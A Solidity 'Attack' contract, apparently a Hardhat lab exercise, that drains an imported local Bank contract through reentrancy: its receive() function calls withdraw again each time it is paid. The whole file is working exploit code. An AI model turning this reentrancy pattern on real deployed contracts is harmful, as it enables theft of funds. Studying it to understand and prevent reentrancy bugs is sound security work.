//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Bank.sol";
// abstract contract Bank {
//     function deposit() public payable virtual;
//     function withdraw(uint _amount) public payable virtual;
// }

contract Attack {
    Bank bank;

    constructor (Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
       
    }
    receive() external payable {
        if (address(bank).balance >2 ether) {
            bank.withdraw(1 ether);
        }
    }
    function attack() public payable {
        bank.deposit{value: 2.1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function deposit() public payable {
        
    }
}